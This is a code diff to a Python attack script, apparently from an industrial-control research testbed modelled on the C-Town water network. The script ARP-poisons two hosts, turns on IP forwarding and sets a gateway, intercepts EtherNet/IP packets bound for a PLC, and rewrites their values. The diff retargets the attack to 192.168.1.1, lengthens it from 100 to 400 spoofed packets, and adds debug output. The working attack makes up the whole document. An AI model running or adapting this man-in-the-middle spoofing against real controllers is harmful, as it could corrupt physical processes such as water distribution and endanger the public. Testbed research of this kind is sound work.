@@ -7,13 +7,14 @@ from scapy.all import *
 import sys
 import os
 import time
+import shlex
 
 from ips import PLC_IPS
 
 import sqlite3
 
 # connection to the database
-conn = sqlite3.connect('../../ICS_topologies/ctown_topology/ctown_db.sqlite')
+conn = sqlite3.connect('../../ICS_topologies/enhanced_ctown_topology/ctown_db.sqlite')
 c = conn.cursor()
 iteration = 0
 enip_port = 44818
@@ -42,14 +43,12 @@ def spoof_value(raw):
 
 def capture(packet):
     print("Packet...")
-    c.execute("UPDATE ctown SET value = 1 WHERE name = 'ATT_1'")
-    conn.commit()
     pkt = IP(packet.get_payload())
     if len(pkt) == 102:
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
 
-        if sys.argv[1] == 'plc5':
+        if sys.argv[1] == '192.168.1.1':
             global spoof_attack_counter
             spoof_attack_counter += 1
             pay = spoof_value(raw)
@@ -57,7 +56,7 @@ def capture(packet):
             del pkt[TCP].chksum  # Needed to recalculate the checksum
             packet.set_payload(str(pkt))
 
-            if spoof_attack_counter > 100:
+            if spoof_attack_counter > 400:
                 print("Attack finished")
                 global spoof_phase
                 spoof_phase = 0
@@ -117,16 +116,21 @@ def __setdown(port):
     conn.commit()
 
 def launch_arp_poison():
-    print("[*] Launching arp poison on " + sys.argv[2])
-
     targetip = sys.argv[2]
     sourceip = sys.argv[1]
+
+    print("[*] Launching arp poison sourceip: " + sys.argv[1])
+    print("[*] Launching arp poison targetip: " + sys.argv[2])
 
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
     targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
 
+    print("[*] Targetmac: " + str(targetmac))
+
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
-    sourcemac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
+    response = srp(arppacket, timeout=2, verbose=False)
+    print(str(response))
+    sourcemac = response[0][0][1].hwsrc
 
     spoof_arp_cache(sourceip, sourcemac, targetip)
     spoof_arp_cache(targetip, targetmac, sourceip)
@@ -136,8 +140,13 @@ def spoof_arp_cache(targetip, targetmac, sourceip):
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
     send(spoofed, verbose=False)
 
+def prepare_network():
+    subprocess.call(['route', 'add', 'default', 'gw', '192.168.1.254'], shell=False)
+    args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
+    subprocess.call(args, shell=False)
 
 if __name__ == '__main__':
+    prepare_network()
     sleep_count = 0
     sleep_limit = 576
     #sleep_limit = 1 #for debug onlyu
